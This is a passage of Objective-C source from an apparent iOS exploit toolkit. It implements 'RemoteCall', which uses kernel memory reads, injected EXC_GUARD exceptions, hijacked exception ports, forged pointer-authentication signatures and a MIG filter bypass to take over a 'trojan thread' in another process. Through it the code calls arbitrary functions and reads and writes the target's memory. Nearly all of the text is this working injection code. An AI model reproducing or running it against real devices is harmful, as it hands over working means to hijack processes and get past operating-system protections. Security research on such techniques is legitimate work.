    printf("(rc) %s func's retValue = 0x%llx(%llu)\n", name, retValue, retValue);
    if(isTempCall && strcmp(name, "getpid") == 0 && retValue == 0) {
        printf("(rc) getpid failed without spin\n");
        fflush(stdout);
    }
    return retValue;
}

// performSelectorOnMainThread doesn't return result, so we run the entire code block in main thread
- (BOOL)doRemoteCallSyncOnMainThread:(BOOL (^)(void))block {
    if (!_creatingExtraThread) {
        return block();
    }
    
    // Set exception port on main thread
    uint64_t oldTrojanThreadAddr = _trojanThreadAddr;
    _trojanThreadAddr = ds_kread64(_taskAddr + off_task_threads_next);
    [self setExceptionPortOnThread:_secondExceptionPort forThread:_trojanThreadAddr useMigFilterBypass:NO];
    
    // Make main thread call FAKE_LR_TROJAN. Yes, dispatch_get_main_queue returns the same pointer across processes.
    uint64_t signedFakePC = remotepac(_trojanThreadAddr, FAKE_PC_TROJAN, 0);
    RemoteArbCallWithTimeout(-1, self, dispatch_async_and_wait_f, (uint64_t)dispatch_get_main_queue(), 0, signedFakePC);
    
    // Now the main thread takes over RemoteCall exception handler, do stuff
    excmsg exc;
    if (!waitexc(_secondExceptionPort, &exc, 5000, false)) {
        printf("(rc) Failed to receive exception on main thread\n");
        return false;
    }
    memcpy(&_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));
    statereply(&exc, &exc.threadState);
    BOOL result = block();
    
    // Restore it
    waitexc(_secondExceptionPort, &exc, 1, false);
    _originalState.__flags = exc.threadState.__flags;
    [self signState:_trojanThreadAddr withState:&_originalState pc:nativestrip((uint64_t)getpid) lr:_originalState.__lr];
    if (!statereply(&exc, &_originalState)) {
        return false;
    }
    
    // Now we're back to call thread, remove exception handler
    [self setExceptionPortOnThread:0 forThread:_trojanThreadAddr useMigFilterBypass:NO];
    _trojanThreadAddr = oldTrojanThreadAddr;
    return result;
}

// bool restore_trojan_thread(arm_thread_state64_internal *state)
- (BOOL)restoreTrojanThreadWithState:(arm_thread_state64_internal *)state
{
    excmsg exc;
    if (!waitexc(_firstExceptionPort, &exc, 5000, false)) {
        printf("(rc) Failed to receive exception while restoring\n");
        return false;
    }
    
    state->__flags = exc.threadState.__flags;
    [self signState:_trojanThreadAddr withState:state pc:state->__pc lr:state->__lr];
    if (!statereply(&exc, state)) {
        return false;
    }
    _originalThreadNeedsRestore = false;
    return true;
}

// int destroy_remote_call(void) {
- (int)destroyRemoteCall {
    printf("(rc) destroyRemoteCall enter success=%d trojanMem=0x%llx creatingExtraThread=%d originalNeedsRestore=%d firstPort=0x%x secondPort=0x%x\n",
           _success,
           _trojanMem,
           _creatingExtraThread,
           _originalThreadNeedsRestore,
           _firstExceptionPort,
           _secondExceptionPort);
    fflush(stdout);

    BOOL restoredIOS16ActionsBeforeRemoteCleanup = NO;
    if (rc_is_ios16() && _success && _trojanMem && _creatingExtraThread) {
        uint64_t trojanTro = _trojanThreadAddr ? thread_get_t_tro(_trojanThreadAddr) : 0;
        RC_IOS16_DEBUG_LOG("(rc.iOS16) restore exc-actions before extra-thread cleanup skip_tro=0x%llx\n", trojanTro);
        fflush(stdout);
        [self restoreIOS16ExceptionActionsSkippingThreadRo:trojanTro];
        restoredIOS16ActionsBeforeRemoteCleanup = YES;
    }

    if (_success && _trojanMem) {
        if (_trojanMemIsStackFallback) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) skip munmap for stack fallback trojanMem=0x%llx\n", _trojanMem);
            fflush(stdout);
        } else {
            RemoteArbCallWithTimeout(100, self, munmap, _trojanMem, PAGE_SIZE);
        }

        if (_creatingExtraThread) {
            RemoteArbCallWithTimeout(-1, self, pthread_exit, 0);
        }
        else {
            [self restoreTrojanThreadWithState:&_originalState];
        }
    } else if (_originalThreadNeedsRestore) {
        [self restoreTrojanThreadWithState:&_originalState];
    }

    if (_firstExceptionPort != MACH_PORT_NULL) {
        mach_port_destruct(mach_task_self_, _firstExceptionPort, 0, 0);
        _firstExceptionPort = MACH_PORT_NULL;
    }
    if (_secondExceptionPort != MACH_PORT_NULL) {
        mach_port_destruct(mach_task_self_, _secondExceptionPort, 0, 0);
        _secondExceptionPort = MACH_PORT_NULL;
    }
    if (rc_is_ios16() && !restoredIOS16ActionsBeforeRemoteCleanup) {
        [self restoreIOS16ExceptionActions];
    }
    if (_dummyThread) {
        if (!rc_is_ios16()) {
            pthread_cancel(_dummyThread);
        }
        _dummyThread = NULL;
    }
    
    self.threadList = [NSMutableArray new];
    _trojanMem = 0;
    _trojanMemIsStackFallback = false;
    _trojanMemScratchOffset = 0;
    _success = false;
    _creatingExtraThread = false;
    _originalThreadNeedsRestore = false;
    _liveContainerRuntime = false;
    
    return 0;
}

- (void)dealloc {
    printf("(rc) RemoteCall dealloc\n");
    fflush(stdout);
    [self destroyRemoteCall];
}

// struct vmshmem *get_shmem_from_cache(uint64_t pageAddr)
- (struct vmshmem *)getShmemFromCache:(uint64_t)pageAddr
{
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (_shmemCache[i].used && _shmemCache[i].remoteAddress == pageAddr)
            return &_shmemCache[i];
    }
    return NULL;
}

// struct vmshmem *put_shmem_in_cache(struct vmshmem *shmem)
- (struct vmshmem *)putShmemInCache:(struct vmshmem *)shmem
{
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (!_shmemCache[i].used) {
            _shmemCache[i] = *shmem;
            _shmemCache[i].used = true;
            return &_shmemCache[i];
        }
    }
    printf("(rc) g_RC_shmemCache full\n");
    return NULL;
}

// struct vmshmem *get_shmem_for_page(uint64_t pageAddr)
- (struct vmshmem *)get_shmemForPage:(uint64_t)pageAddr
{
    struct vmshmem *cached = [self getShmemFromCache:pageAddr];
    if (cached) return cached;

    struct vmshmem newShmem = vmmapremotepage(_vmMap, pageAddr);
    if (!newShmem.localAddress)
            return NULL;
    return [self putShmemInCache:&newShmem];
}

// bool remote_read(uint64_t src, void *dst, uint64_t size)
- (BOOL)remoteRead:(uint64_t)src to:(void *)dst size:(uint64_t)size
{
    if (!src || !dst || !size) return false;
    uint64_t dstAddr = (uint64_t)(uintptr_t)dst;
    uint64_t until = src + size;

    while (src < until) {
        uint64_t remaining = until - src;
        uint64_t offs      = src & PAGE_MASK;
        uint64_t roundUp   = (src + PAGE_SIZE) & ~PAGE_MASK;
        uint64_t copyCount = (roundUp - src < remaining) ? (roundUp - src) : remaining;
        uint64_t pageAddr  = src & ~PAGE_MASK;

        struct vmshmem *page = [self get_shmemForPage:pageAddr];
        if (!page) {
            printf("(rc) remote_read failed: unable to find remote page\n");
            return false;
        }
        memcpy((void *)(uintptr_t)dstAddr, (void *)(uintptr_t)(page->localAddress + offs), (size_t)copyCount);
        src     += copyCount;
        dstAddr += copyCount;
    }
    return true;
}

// uint64_t remote_read64(uint64_t src)
- (uint64_t)remoteRead64From:(uint64_t)src
{
    uint64_t val = 0;
    if (![self remoteRead:src to:&val size:sizeof(val)]) return 0;
    return val;
}

// void remote_hexdump(uint64_t remoteAddr, size_t size)
- (void)remoteHexdumpFrom:(uint64_t)remoteAddr size:(size_t)size
{
    uint8_t *buf = (uint8_t *)malloc(size);
    if (!buf) {
        return;
    }

    if (![self remoteRead:remoteAddr to:buf size:size]) {
        printf("(rc) remote_read failed at 0x%llx\n", (unsigned long long)remoteAddr);
        free(buf);
        return;
    }

    char ascii[17];
    ascii[16] = '\0';
    for (size_t i = 0; i < size; ++i) {
        if ((i % 16) == 0)
            printf("[0x%016llx+0x%03zx] ", (unsigned long long)remoteAddr, i);

        printf("%02X ", buf[i]);
        ascii[i % 16] = (buf[i] >= ' ' && buf[i] <= '~') ? buf[i] : '.';

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) printf(" ");
                for (size_t j = (i + 1) % 16; j < 16; ++j)
                    printf("   ");
                printf("|  %s \n", ascii);
            }
        }
    }

    free(buf);
}

// bool remote_write(uint64_t dst, const void *src, uint64_t size)
- (BOOL)remote_write:(uint64_t)dst from:(const void *)src size:(uint64_t)size
{
    if (!src || !dst || !size) return false;
    
    uint64_t srcAddr = (uint64_t)(uintptr_t)src;
    uint64_t until   = dst + size;

    while (dst < until) {
        uint64_t remaining = until - dst;
        uint64_t offs      = dst & PAGE_MASK;
        uint64_t roundUp   = (dst + PAGE_SIZE) & ~PAGE_MASK;
        uint64_t copyCount = (roundUp - dst < remaining) ? (roundUp - dst) : remaining;
        uint64_t pageAddr  = dst & ~PAGE_MASK;

        struct vmshmem *page = [self get_shmemForPage:pageAddr];
        if (!page) {
            printf("(rc) remote_write failed: unable to find remote page\n");
            return false;
        }

        memcpy((void *)(uintptr_t)(page->localAddress + offs), (const void *)(uintptr_t)srcAddr, (size_t)copyCount);
        dst     += copyCount;
        srcAddr += copyCount;
    }
    return true;
}

//bool remote_write64(uint64_t dst, uint64_t val)
- (BOOL)remote_write64:(uint64_t)dst value:(uint64_t)val
{
    return [self remote_write:dst from:&val size:sizeof(val)];
}

//bool remote_writeStr(uint64_t dst, const char *str)
- (BOOL)remote_write:(uint64_t)dst string:(const char *)str
{
    if (!str) return false;

    size_t len = strlen(str) + 1;
    return [self remote_write:dst from:str size:len];
}

//uint64_t retry_first_thread(bool useMigFilterBypass) {
- (uint64_t)retryFirstThreadWithMigFilterBypass:(BOOL)useMigFilterBypass {
    if (useMigFilterBypass)
        mig_bypass_pause();
    
    sleep(1);
    
    if (useMigFilterBypass)
        mig_bypass_resume();
    
    return ds_kread64(_taskAddr + off_task_threads_next);
}

// NOTE: Do not run this function while "attaching xcode" on iOS 18+, it will make device unstable.
//int init_remote_call(const char* process, bool useMigFilterBypass) {
- (int)initRemoteCallForProcess:(const char *)process useMigFilterBypass:(BOOL)useMigFilterBypass {
    NSOperatingSystemVersion rcVersion = [[NSProcessInfo processInfo] operatingSystemVersion];
    BOOL useIOS16RemoteCall = rc_is_ios16();
    printf("(rc) route process=%s os=%ld.%ld.%ld ios16=%d\n",
           process ?: "(null)",
           (long)rcVersion.majorVersion,
           (long)rcVersion.minorVersion,
           (long)rcVersion.patchVersion,
           useIOS16RemoteCall);
    fflush(stdout);

    if (useIOS16RemoteCall) {
        return [self initRemoteCallForProcessIOS16:process useMigFilterBypass:useMigFilterBypass];
    }

    if (!process || process[0] == '\0') {
        return -1;
    }

    if (is_pac_supported() && !pacsignworks()) {
        self.lastError = @"RemoteCall needs an arm64e/PAC-capable launch context.";
        return -1;
    }

    _liveContainerRuntime = islcruntime();
    if (_liveContainerRuntime) {
        bool localPACWorks = pacsignworks();
        if (!localPACWorks) {
            self.lastError = @"LiveContainer can run the exploit, but this launch context cannot generate arm64e PAC for RemoteCall.";
            return -1;
        }
    }

    uint64_t procAddr = proc_find_by_name(process);
    if (!procAddr) {
        printf("(rc) Unable to find process: %s\n", process);
        return -1;
    }
    printf("(rc) process: %s, pid: %u\n",  process, ds_kread32(procAddr + off_proc_p_pid));
    _taskAddr = proc_task(procAddr);
    if (!_taskAddr) {
        return -1;
    }
    
    mach_port_t firstExceptionPort = createexcport();
    mach_port_t secondExceptionPort = createexcport();
    
    printf("(rc) firstExceptionPort: 0x%x, secondExceptionPort: 0x%x\n", firstExceptionPort, secondExceptionPort);
    
    if (!firstExceptionPort || !secondExceptionPort)
    {
        printf("(rc) Couldn't create exception ports\n");
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }
    
    // Make sure the task won't crash after we handle an exception
    if (!rc_disable_excguard_kill_checked(_taskAddr)) {
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }
    
    mach_exception_code_t guardCode = 0;
    EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
    EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
    EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503ULL);  // ??? what is 0xf503 value meaning?
    
    uint64_t selfTask = task_self();
    uint64_t firstPortAddr = rc_task_get_ipc_port_object(selfTask, firstExceptionPort);
    uint64_t secondPortAddr = rc_task_get_ipc_port_object(selfTask, secondExceptionPort);
    if (!firstPortAddr || !secondPortAddr) {
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }
    
    pthread_t dummyThread = NULL;
    void *dummyFunc = dlsym(RTLD_DEFAULT, "getpid");
    if (!dummyFunc) {
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }
    int dummyErr = pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
    if (dummyErr != 0 || !dummyThread) {
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }
    mach_port_t dummyThreadMach = pthread_mach_thread_np(dummyThread);
    if (dummyThreadMach == MACH_PORT_NULL) {
        pthread_cancel(dummyThread);
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }
    uint64_t dummyThreadAddr = rc_task_get_ipc_port_kobject(selfTask, dummyThreadMach);
    uint64_t dummyThreadTro = ds_kread64(dummyThreadAddr + off_thread_t_tro);
    mach_port_t threadSelf = mach_thread_self();
    uint64_t selfThreadAddr = rc_task_get_ipc_port_kobject(selfTask, threadSelf);
    uint32_t selfThreadCtid = ds_kread32(selfThreadAddr + off_thread_ctid);
    if (!dummyThreadAddr || !dummyThreadTro || !selfThreadAddr) {
        pthread_cancel(dummyThread);
        mach_port_deallocate(mach_task_self_, threadSelf);
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }
    mach_port_deallocate(mach_task_self_, threadSelf);
    
    _creatingExtraThread = false;
    _firstExceptionPort = firstExceptionPort;
    _secondExceptionPort = secondExceptionPort;
    _firstExceptionPortAddr = firstPortAddr;
    _secondExceptionPortAddr = secondPortAddr;
    _dummyThread = dummyThread;
    _dummyThreadMach = dummyThreadMach;
    _dummyThreadAddr = dummyThreadAddr;
    _dummyThreadTro = dummyThreadTro;
    _selfThreadAddr = selfThreadAddr;
    _selfThreadCtid = selfThreadCtid;
    
    self.threadList = [NSMutableArray new];
    
    int retryCount = 0;
    int validThreadCount = 0;
    int successThreadCount = 0;
    uint64_t firstThread = ds_kread64(_taskAddr + off_task_threads_next);
    uint64_t currThread = firstThread;
    if (!firstThread) {
        [self destroyRemoteCall];
        return -1;
    }
    
    _trojanThreadAddr = 0;
    
    if (useMigFilterBypass)
        mig_bypass_resume();
    
    while (successThreadCount < 1 && validThreadCount < 5 && retryCount < 3) {
        uint64_t task = thread_get_task(currThread);
        if (!task) {
            if (!validThreadCount) {
                printf("(rc) failed on getting first thread at all, resetting\n");
                firstThread = [self retryFirstThreadWithMigFilterBypass:useMigFilterBypass];
                currThread = firstThread;
                retryCount++;
                continue;
            } else {
                break;
            }
        }
        
        if (task == _taskAddr) {
            if (![self setExceptionPortOnThread:firstExceptionPort forThread:currThread useMigFilterBypass:useMigFilterBypass]) {
                printf("(rc) Set exception port on thread:0x%llx failed\n", (unsigned long long)currThread);
                if (!validThreadCount) {
                    printf("(rc) failed on first thread, resetting first thread and currThread\n");
                    firstThread = [self retryFirstThreadWithMigFilterBypass:useMigFilterBypass];
                    currThread = firstThread;
                    retryCount++;
                    continue;
                }
            } else {
                // Inject a EXC_GUARD exception on this thread
                if (!injectguardexc(currThread, guardCode)) {
                    printf("(rc) Inject EXC_GUARD on thread:0x%llx failed, not injecting\n", (unsigned long long)currThread);
                    if (!validThreadCount) {
printf("(rc) failed on first thread, resetting first thread and currThread\n");
                        firstThread = [self retryFirstThreadWithMigFilterBypass:useMigFilterBypass];
                        currThread = firstThread;
                        retryCount++;
                        continue;
                    }
                } else {
                    _trojanThreadAddr = currThread;
                    successThreadCount++;
                    [_threadList addObject:@(currThread)];
                    printf("(rc) Inject EXC_GUARD on thread:0x%llx OK\n", (unsigned long long)currThread);
                }
            }
            validThreadCount++;
        } else if (task && !validThreadCount) {
            printf("(rc) Got weird tro on first thread, resetting\n");
            firstThread = [self retryFirstThreadWithMigFilterBypass:useMigFilterBypass];
            currThread = firstThread;
            retryCount++;
            continue;
        }
        
        uint64_t next = ds_kread64(currThread + off_thread_task_threads_next);
        if (!next) {
            if (!validThreadCount) {
                printf("(rc) Got empty next thread. Retry\n");
                firstThread = [self retryFirstThreadWithMigFilterBypass:useMigFilterBypass];
                currThread = firstThread;
                retryCount++;
                continue;
            } else {
                printf("(rc) Break because of empty next thread\n");
                break;
            }
        }
        currThread = next;
    }
    
    if(useMigFilterBypass)
        mig_bypass_pause();
    
    printf("(rc) Valid threads: %d\n", validThreadCount);
    printf("(rc) Injected threads: %d\n", successThreadCount);
    
    if (_threadList.count == 0) {
        printf("(rc) Exception injection failed. Aborting.\n");
        [self destroyRemoteCall];
        return -1;
    }
    
    excmsg exc;
    if(!waitexc(firstExceptionPort, &exc, 120000, false)) {
        printf("(rc) Failed to receive first exception\n");
        [self destroyRemoteCall];
        return -1;
    }
    
    memcpy(&_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));
    
    for (NSNumber *thread in _threadList) {
        clearguardexc(thread.unsignedLongLongValue);
    }
    printf("(rc) Finish clearing EXC_GUARD from all other threads...\n");
    
    excmsg exc2;
    int desiredTimeout = 1500;
    while (waitexc(firstExceptionPort, &exc2, desiredTimeout, false)) {
        statereply(&exc2, &exc2.threadState);
    }
    
    uint64_t trojanMemTemp = ((uint64_t)exc.threadState.__sp & 0x7fffffffffULL) - 0x4000ULL;
    printf("(rc) trojanMemTemp: 0x%llx\n", trojanMemTemp);
    fflush(stdout);
    
    _vmMap = task_get_vm_map(_taskAddr);
    printf("(rc) vmMap: 0x%llx\n", _vmMap);
    fflush(stdout);

    // Match wh1te4ever / pre-OOP Lara: use a low fake PC gate so the first
    // parked exception is EXC_BAD_ACCESS, not EXC_BREAKPOINT.
    uint64_t firstThreadParkTrap = FAKE_PC_TROJAN_CREATOR;
    _firstThreadReturnTrap = FAKE_LR_TROJAN_CREATOR;
    _secondThreadReturnTrap = FAKE_LR_TROJAN;

    _originalThreadNeedsRestore = true;

    uint64_t probePid = 0;
    if (_liveContainerRuntime) {
        uint64_t noArgs[1] = {0};
        probePid = [self doRemoteCallWithPendingException:&exc
                                                  timeout:100
                                            exceptionPort:firstExceptionPort
                                                 lrMarker:_firstThreadReturnTrap
                                             functionName:"getpid"
                                          functionPointer:getpid
                                                     args:noArgs
                                                 argCount:0];
    } else {
        arm_thread_state64_internal parkState = exc.threadState;
        [self signState:_trojanThreadAddr withState:&parkState pc:firstThreadParkTrap lr:_firstThreadReturnTrap];
        if (!statereply(&exc, &parkState)) {
            [self destroyRemoteCall];
            return -1;
        }

        probePid = RemoteArbCallTempWithTimeout(100, self, getpid);
    }
    if (!probePid) {
        [self destroyRemoteCall];
        return -1;
    }
    
    uint64_t threadStartTrap = FAKE_PC_TROJAN;
    uint64_t remoteCrashSigned = remotepac(_trojanThreadAddr, threadStartTrap, 0);
    printf("(rc) remoteCrashSigned: 0x%llx\n", remoteCrashSigned);
    fflush(stdout);
    if (!remoteCrashSigned) {
        [self destroyRemoteCall];
        return -1;
    }
    uint64_t createThreadRet = RemoteArbCallTempWithTimeout(100, self, pthread_create_suspended_np, trojanMemTemp, 0, remoteCrashSigned, 0);
    
    printf("(rc) trojanMemTemp: 0x%llx\n", trojanMemTemp);
    uint64_t pthreadAddr    = self[trojanMemTemp].value64;
    printf("(rc) pthreadAddr: 0x%llx\n", pthreadAddr);
    if (createThreadRet != 0 || !pthreadAddr) {
        [self destroyRemoteCall];
        return -1;
    }
    uint64_t callThreadPort = RemoteArbCallTempWithTimeout(100, self, pthread_mach_thread_np, pthreadAddr);
    printf("(rc) callThreadPort: 0x%llx\n", callThreadPort);
    if (!callThreadPort) {
        [self destroyRemoteCall];
        return -1;
    }
    _callThreadAddr = rc_task_get_ipc_port_kobject(_taskAddr, (mach_port_t)callThreadPort);
    if (!_callThreadAddr) {
        [self destroyRemoteCall];
        return -1;
    }
    
    if(useMigFilterBypass)
        mig_bypass_resume();
    
    if (![self setExceptionPortOnThread:secondExceptionPort forThread:_callThreadAddr useMigFilterBypass:useMigFilterBypass]) {
        printf("(rc) Failed set exc port on new thread, retrying...\n");
        int retryDummyErr = pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
        if (retryDummyErr != 0 || !dummyThread) {
            if(useMigFilterBypass)
                mig_bypass_pause();
            [self destroyRemoteCall];
            return -1;
        }
        _dummyThreadMach = pthread_mach_thread_np(dummyThread);
        if (_dummyThreadMach == MACH_PORT_NULL) {
            pthread_cancel(dummyThread);
            if(useMigFilterBypass)
                mig_bypass_pause();
            [self destroyRemoteCall];
            return -1;
        }
        _dummyThreadAddr = rc_task_get_ipc_port_kobject(task_self(), _dummyThreadMach);
        _dummyThreadTro  = thread_get_t_tro(_dummyThreadAddr);
        if (!_dummyThreadAddr || !_dummyThreadTro) {
            pthread_cancel(dummyThread);
            if(useMigFilterBypass)
                mig_bypass_pause();
            [self destroyRemoteCall];
            return -1;
        }
        sleep(1);
        if (![self setExceptionPortOnThread:secondExceptionPort forThread:_callThreadAddr useMigFilterBypass:useMigFilterBypass]) {
            if(useMigFilterBypass)
                mig_bypass_pause();
            [self destroyRemoteCall];
            return -1;
        }
    }
    
    if(useMigFilterBypass)
        mig_bypass_pause();
    
    printf("(rc) All good! Resuming trojan thread...\n");
    
    uint64_t ret = RemoteArbCallTempWithTimeout(100, self, thread_resume, callThreadPort);
    if (ret != 0) {
        printf("(rc) Couldn't resume new thread, falling back to original\n");
        _creatingExtraThread = false;
    } else {
        _creatingExtraThread = true;
    }
    
    if (_creatingExtraThread) {
        printf("(rc) New thread created, resuming original\n");
        //restore_trojan_thread(&_originalState);
        [self restoreTrojanThreadWithState:&_originalState];
        _trojanThreadAddr = _callThreadAddr;
    }
    printf("(rc) Original thread restored\n");
    
    _pid = (int)RemoteArbCallWithTimeout(100, self, getpid);
    printf("(rc) Task pid: %d\n", _pid);
    if (_pid <= 0) {
        [self destroyRemoteCall];
        return -1;
    }
    
    _trojanMem = RemoteArbCallWithTimeout(100, self, mmap, 0, PAGE_SIZE, VM_PROT_READ | VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, (uint64_t)-1, 0);
    if (!_trojanMem || _trojanMem == UINT64_MAX) {
        _trojanMem = 0;
        [self destroyRemoteCall];
        return -1;
    }
    
    RemoteArbCallWithTimeout(100, self, memset, _trojanMem, 0, PAGE_SIZE);
    
    _success = true;
    printf("(rc) Finished successfully\n");
    
    return 0;
}

- (instancetype)initWithProcess:(NSString *)process useMigFilterBypass:(BOOL)useMigFilterBypass {
    self = [super init];
    g_rc_last_init_error = nil;
    self.lastError = nil;
    const char *processName = process.UTF8String;
    int rc;
    @try {
        rc = [self initRemoteCallForProcess:processName useMigFilterBypass:useMigFilterBypass];
    } @catch (NSException *exception) {
        NSLog(@"(rc) initRemoteCallForProcess failed: %@", exception);
        g_rc_last_init_error = exception.description;
        return nil;
    }
    if (rc) {
        NSLog(@"(rc) initRemoteCallForProcess failed");
        g_rc_last_init_error = self.lastError ?: @"RemoteCall init failed";
        return nil;
    }
    g_rc_last_init_error = nil;
    return self;
}

// read/write memory via subscripting
- (RemotePointer *)objectAtIndexedSubscript:(uint64_t)address {
    return [[RemotePointer alloc] initWithRemoteCall:self address:address];
}

@end

@implementation RemotePointer
- (instancetype)initWithRemoteCall:(RemoteCall *)remoteCall address:(NSUInteger)address {
    self = [super init];
    _remoteCall = remoteCall;
    _address = address;
    return self;
}

- (void)setString:(NSString *)string {
    [self.remoteCall remote_write:_address string:string.UTF8String];
}
- (void)setValue8:(uint8_t)val {
    [self.remoteCall remote_write:_address from:&val size:sizeof(val)];
}
- (void)setValue16:(uint16_t)val {
    [self.remoteCall remote_write:_address from:&val size:sizeof(val)];
}
- (void)setValue32:(uint32_t)val {
    [self.remoteCall remote_write:_address from:&val size:sizeof(val)];
}
- (void)setValue64:(uint64_t)val {
    [self.remoteCall remote_write:_address from:&val size:sizeof(val)];
}
- (void)setValueDouble:(CGFloat)val {
    [self.remoteCall remote_write:_address from:&val size:sizeof(val)];
}

- (NSString *)string {
    // I'm lazy to deal with mem leak so I'm just wrapping it to NSString for ARC to do its job
    size_t len = RemoteArbCall(self.remoteCall, strlen, _address);
    char *buf = malloc(len + 1);
    if (!buf) return nil;
    [self.remoteCall remoteRead:_address to:buf size:len];
    buf[len] = '\0';
    NSString *result = @(buf);
    free(buf);
    return result;
}
- (uint8_t)value8 {
    uint8_t val = 0;
    [self.remoteCall remoteRead:_address to:&val size:sizeof(val)];
    return val;
}
- (uint16_t)value16 {
    uint16_t val = 0;
    [self.remoteCall remoteRead:_address to:&val size:sizeof(val)];
    return val;
}
- (uint32_t)value32 {
    uint32_t val = 0;
    [self.remoteCall remoteRead:_address to:&val size:sizeof(val)];
    return val;
}
- (uint64_t)value64 {
    uint64_t val = 0;
    [self.remoteCall remoteRead:_address to:&val size:sizeof(val)];
    return val;
}
- (CGFloat)valueDouble {
    CGFloat val = 0;
    [self.remoteCall remoteRead:_address to:&val size:sizeof(val)];
    return val;
}
@end

uint64_t remote_alloc_str(RemoteCall *proc, const char *str) {
    uint64_t len = strlen(str) + 1;
    if (proc.trojanMemIsStackFallback) {
        uint64_t offset = (proc.trojanMemScratchOffset + 7) & ~7ULL;
        if (offset + len > PAGE_SIZE) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) stack fallback remote_alloc_str overflow len=0x%llx offset=0x%llx\n", len, offset);
            fflush(stdout);
            return 0;
        }
        uint64_t buf = proc.trojanMem + offset;
        if (![proc remote_write:buf from:str size:len]) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) stack fallback remote_alloc_str write failed buf=0x%llx len=0x%llx\n", buf, len);
            fflush(stdout);
            return 0;
        }
        proc.trojanMemScratchOffset = offset + len;
        RC_IOS16_DEBUG_LOG("(rc.iOS16) stack fallback remote_alloc_str buf=0x%llx len=0x%llx next=0x%llx str=%s\n",
               buf, len, proc.trojanMemScratchOffset, str);
        fflush(stdout);
        return buf;
    }
    uint64_t buf = RemoteArbCall(proc, malloc, len);
    if (buf) proc[buf].string = @(str);
    return buf;
}

uint64_t remote_sel(RemoteCall *proc, const char *name) {
    uint64_t str = remote_alloc_str(proc, name);
    uint64_t sel = RemoteArbCall(proc, sel_registerName, str);
    if (!proc.trojanMemIsStackFallback) {
        RemoteArbCall(proc, free, str);
    }
    return sel;
}

uint64_t remote_getClass(RemoteCall *proc, const char *name) {
    uint64_t str = remote_alloc_str(proc, name);
    uint64_t cls = RemoteArbCall(proc, objc_getClass, str);
    if (!proc.trojanMemIsStackFallback) {
        RemoteArbCall(proc, free, str);
    }
    return cls;
}

uint64_t remote_msg(RemoteCall *proc, uint64_t obj, uint64_t sel,
    uint64_t a0, uint64_t a1, uint64_t a2, uint64_t a3) {
    return RemoteArbCall(proc, objc_msgSend, obj, sel, a0, a1, a2, a3);
}

int remote_errno(RemoteCall *proc) {
    uint64_t errPtr = RemoteArbCall(proc, __error);
    if (!errPtr) return -1;

    return proc[errPtr].value32;
}

uint64_t remote_NSString(RemoteCall *proc, const char *str) {
    uint64_t sel_stringWithCString = remote_sel(proc, "stringWithCString:");
    uint64_t cls_NSString = remote_getClass(proc, "NSString");
    uint64_t resultCStr = remote_alloc_str(proc, str);
    uint64_t result = remote_msg(proc, cls_NSString, sel_stringWithCString, resultCStr, 0, 0, 0);
    if (!proc.trojanMemIsStackFallback) {
        RemoteArbCall(proc, free, resultCStr);
    }
    return result;
}

// Helper to get/set CGRect from double registers that we cannot modify via normal thread state
CGRect remote_getCGRect(RemoteCall *proc, uint64_t obj, uint64_t sel) {
    // Spill CGRect to double registers first
    remote_msg(proc, obj, sel, 0,0,0,0);
    
    // -[CAMetalDrawable setDirtyRect:]: save double registers to address
    // stp    d0, d1, [x0, #0x20]
    // stp    d2, d3, [x0, #0x30]
    // ret
    uint64_t where = proc.trojanMem;
    Class class = NSClassFromString(@"CAMetalDrawable");
    Method method = class_getInstanceMethod(class, @selector(setDirtyRect:));
    void *setDoubleRegistersImp = method_getImplementation(method);
    RemoteArbCall(proc, setDoubleRegistersImp, where-0x20);
    
    CGRect result;
    [proc remoteRead:where to:&result size:sizeof(result)];
    return result;
}

void remote_setCGRect(RemoteCall *proc, uint64_t obj, uint64_t sel, CGRect newRect) {
    uint64_t where = proc.trojanMem;
    [proc remote_write:where from:&newRect size:sizeof(newRect)];
    // -[CAMetalDrawable dirtyRect]: spill to double registers
    // ldp    d0, d1, [x0, #0x20]
    // ldp    d2, d3, [x0, #0x30]
    // ret
    Class class = NSClassFromString(@"CAMetalDrawable");
    Method method = class_getInstanceMethod(class, @selector(dirtyRect));
    void *setDoubleRegistersImp = method_getImplementation(method);
    RemoteArbCall(proc, setDoubleRegistersImp, where-0x20);
    
    // Now do the actual thing
    remote_msg(proc, obj, sel, 0,0,0,0);
}

#pragma mark - iOS 16

#define RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS          0x58
#define RC_IOS16_KERNEL_SAVED_X27                   0x40
#define RC_IOS16_ZONE_WRITE_LEN                     0x20
